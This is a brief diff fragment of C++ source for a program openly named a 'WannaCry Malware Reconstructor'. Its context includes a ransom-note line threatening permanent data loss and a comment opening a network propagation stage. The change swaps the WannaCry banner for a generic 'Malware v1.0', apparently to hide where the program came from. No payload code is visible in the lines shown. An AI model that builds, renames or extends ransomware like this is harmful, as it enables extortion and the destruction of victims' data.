@@ -240,7 +240,7 @@ NOTE: If you do not pay, your data is subject to permanent loss.
 // --- Main Entry Point ---
 int main() {
     std::cout << "=====================================================" << std::endl;
-    std::cout << "          WannaCry Malware Reconstructor v1.0        " << std::endl;
+    std::cout << "                     Malware v1.0                    " << std::endl;
     std::cout << "=====================================================" << std::endl;
 
     // 1. Propagation (Network)
